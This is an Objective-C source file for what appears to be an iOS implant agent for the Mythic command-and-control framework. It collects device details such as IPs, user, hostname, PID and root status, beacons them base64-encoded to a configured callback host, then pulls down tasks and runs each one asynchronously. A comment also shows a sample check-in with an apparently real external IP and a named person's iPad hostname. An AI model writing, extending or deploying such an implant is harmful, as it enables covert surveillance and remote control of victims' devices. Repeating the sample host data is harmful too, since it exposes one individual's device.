#import <Foundation/Foundation.h>
#include <complex.h>
#import "HTTPC2Config.h"
#import "SystemInfoHelper.h"
#import "C2CheckIn.h"
#import "C2Task.h"

/// Track the callback UUID (used for sending agent messages)
NSString *callbackUUID = nil; 

@implementation C2CheckIn

+ (void)processTasksFromResponse:(NSDictionary *)taskingResponse {
    NSArray *tasksArray = taskingResponse[@"tasks"];
    
    NSMutableArray<C2Task *> *tasks = [NSMutableArray array];
    for (NSDictionary *taskDict in tasksArray) {
        C2Task *task = [[C2Task alloc] initWithDictionary:taskDict];
        [tasks addObject:task];
    }

    // Process each task asynchronously
    for (C2Task *task in tasks) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            [task executeTask];
        });
    }
}

#pragma mark - Helper Method for Networking

+ (void)sendPOSTRequestWithURL:(NSURL *)url
                       payload:(NSDictionary *)payload
                       headers:(NSDictionary *)headers
                    completion:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completion {
    
    NSError *jsonError;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:&jsonError];
    if (jsonError) {
        NSLog(@"[ERROR] ❌ Error creating the POST JSON: %@", jsonError.localizedDescription);
        completion(nil, nil, jsonError);
        return;
    }
    
    /// Concatenate the UUID and JSON data and base64 encode per Mythic docs
    /* ## Here's an example of the check-in message format
    e40a89c6-f245-4f3b-b81c-21f2f725e9c2{
        "uuid": "e40a89c6-f245-4f3b-b81c-21f2f725e9c2",
        "external_ip": "136.24.173.189",
        "process_name": "aura",
        "domain": "local",
        "os": "iOS 12.5.7",
        "action": "checkin",
        "host": "brandontonsipad.localdomain",
        "architecture": "arm64",
        "ips": [
            "192.168.0.18"
        ],
        "user": "mobile",
        "pid": 3265,
        "integrity_level": 2
    }
    */
    NSMutableData *messageData = [[payload[@"uuid"] dataUsingEncoding:NSUTF8StringEncoding] mutableCopy];
    [messageData appendData:jsonData];
    NSString *base64Message = [messageData base64EncodedStringWithOptions:0];
    
    /// Setup the POST request
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setHTTPBody:[base64Message dataUsingEncoding:NSUTF8StringEncoding]];
    [request addValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    /// Add custom HTTP headers
    for (NSString *key in headers) {
        [request addValue:headers[key] forHTTPHeaderField:key];
    }
    
    /// Kick off the POST request
    NSURLSession *session = [NSURLSession sharedSession];
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:completion];
    [task resume];
}

#pragma mark - Check-in Method

+ (void)performPlaintextCheckin {
    /// C2 configuration from the stamped HTTPC2Config
    NSString *callbackHost = [HTTPC2Config callbackHost];
    NSInteger callbackPort = [HTTPC2Config callbackPort];
    NSDictionary *headers = [HTTPC2Config headers];
    NSString *postURI = @"agent_message";
    NSString *payloadUUID = [HTTPC2Config payloadUUID];
    
    /// The check-in endpoint: `http://<callbackHost>:<callbackPort>/agent_message`
    NSString *urlString = [NSString stringWithFormat:@"%@:%ld/%@", callbackHost, (long)callbackPort, postURI];
    NSURL *url = [NSURL URLWithString:urlString];
    NSLog(@"[DEBUG] Check-in URL: %@", url);
    
    /// Gather system information for the check-in
    NSDictionary *checkinData = @{
        @"action": @"checkin",
        @"uuid": payloadUUID,
        @"ips": @[[SystemInfoHelper getInternalIPAddress]],
        @"os": [SystemInfoHelper getOS],
        @"user": [SystemInfoHelper getUser],
        @"host": [SystemInfoHelper getHost],
        @"pid": @([SystemInfoHelper getPID]),
        @"architecture": [SystemInfoHelper getArchitecture],
        @"domain": [SystemInfoHelper getDomain],
        @"external_ip": [SystemInfoHelper getExternalIPAddress],
        @"integrity_level": @(getuid() == 0 ? 4 : 2),
        @"process_name": [SystemInfoHelper getProcessName]
    };
    
    /// Send the POST request
    [self sendPOSTRequestWithURL:url payload:checkinData headers:headers completion:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[ERROR] ❌ Error during check-in: %@", error.localizedDescription);
            return;
        }
        
        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        if (httpResponse.statusCode == 200 && data) {
            NSString *responseString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
            NSLog(@"[DEBUG] Raw check-in response: %@", responseString);
            
            if ([responseString length] > 36) {
                NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:responseString options:0];
                if (!decodedData) {
                    NSLog(@"[ERROR] ❌ Failed to decode base64 response.");
                    return;
                }
                
                NSString *decodedResponseString = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
                NSLog(@"[DEBUG] Decoded response string: %@", decodedResponseString);
                
                NSRange jsonRange = [decodedResponseString rangeOfString:@"{"];
                if (jsonRange.location != NSNotFound) {
                    NSString *responseWithoutUUID = [decodedResponseString substringFromIndex:jsonRange.location];
                    NSData *jsonData = [responseWithoutUUID dataUsingEncoding:NSUTF8StringEncoding];
                    NSDictionary *jsonResponse = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:nil];
                    
                    if (jsonResponse[@"id"]) {
                        /// Set the callback UUID so that we can use it for following messages
                        callbackUUID = jsonResponse[@"id"];
                        NSLog(@"[DEBUG] Our Callback UUID\t===>\t(%@)", callbackUUID);
                    } else {
                        NSLog(@"[ERROR] ❌ No 'id' key found in the JSON.");
                    }
                }
            } else {
                NSLog(@"[ERROR] ❌ Response is too short. Full response: %@", responseString);
            }
        } else {
            NSLog(@"[ERROR] ❌ Failed to check-in with Mythic!. HTTP Status Code: %ld", (long)httpResponse.statusCode);
        }
    }];
}

#pragma mark - Tasking Method

+ (void)getTasking {
    if (callbackUUID == nil) {
        NSLog(@"[ERROR] ❌ No callback UUID available to check for tasking....");
        return;
    }
    
    /// C2 configuration from the stamped HTTPC2Config
    NSString *callbackHost = [HTTPC2Config callbackHost];
    NSInteger callbackPort = [HTTPC2Config callbackPort];
    NSDictionary *headers = [HTTPC2Config headers];
    NSString *postURI = @"agent_message";
    
    /// The get_tasking endpoint: `http://<callbackHost>:<callbackPort>/agent_message`
    NSString *urlString = [NSString stringWithFormat:@"%@:%ld/%@", callbackHost, (long)callbackPort, postURI];
    NSURL *url = [NSURL URLWithString:urlString];
    
    /// Construct the get_tasking JSON
    NSDictionary *taskingData = @{
        @"action": @"get_tasking",
        @"tasking_size": @1,
        @"uuid": callbackUUID
    };
    
    /// Send the POST request
    [self sendPOSTRequestWithURL:url payload:taskingData headers:headers completion:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[ERROR] ❌ Error during get_tasking: %@", error.localizedDescription);
            return;
        }
        
        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        if (httpResponse.statusCode == 200 && data) {
            NSString *responseString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
            NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:responseString options:0];
            if (!decodedData) {
                NSLog(@"[ERROR] ❌ Failed to decode Base64 tasking response.");
                return;
            }
            
            NSString *decodedString = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
            NSRange jsonRange = [decodedString rangeOfString:@"{"];
            if (jsonRange.location != NSNotFound) {
                NSString *jsonString = [decodedString substringFromIndex:jsonRange.location];
                NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
                NSDictionary *taskingResponse = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:nil];
                
                if (taskingResponse) {
                    NSArray *tasksArray = taskingResponse[@"tasks"];
                    if (tasksArray.count > 0) {
                        NSLog(@"[DEBUG] 📋 Tasks received: %@", tasksArray);
                        [self processTasksFromResponse:taskingResponse];
                    }
                } else {
                    NSLog(@"[ERROR] ❌ Failed to parse JSON from decoded tasking response.");
                }
            }
        } else {
            NSLog(@"[ERROR] ❌ Failed to fetch tasking. HTTP Status Code: %ld", (long)httpResponse.statusCode);
        }
    }];
}

@end
